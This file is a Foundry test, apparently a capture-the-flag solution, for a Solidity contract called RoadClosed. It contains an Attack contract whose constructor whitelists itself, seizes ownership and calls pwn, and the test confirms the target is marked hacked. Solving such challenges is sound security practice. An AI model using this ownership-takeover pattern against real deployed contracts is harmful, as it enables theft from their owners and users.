// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.7;

import "forge-std/Test.sol";
import "../src/RoadClosed.sol";

contract RoadClosedTest is Test {
    RoadClosed roadClosed;
    Attack attack;

    address hacker = makeAddr("HACKER");
    address owner = makeAddr("OWNER");

    function setUp() external {
        vm.prank(owner);
        roadClosed = new RoadClosed();
        attack = new Attack(address(roadClosed));
    }

    function test_CheckIfIsHacked() external {
        assertEq(roadClosed.whitelistedMinters(address(attack)), true);
        assertEq(roadClosed.isHacked(), true);
    }
}

contract Attack {
    RoadClosed roadClosed;
    constructor(address _addr) {
        roadClosed = RoadClosed(_addr);
        roadClosed.addToWhitelist(address(this));
        roadClosed.changeOwner(address(this));
        roadClosed.pwn(address(this));
    }
}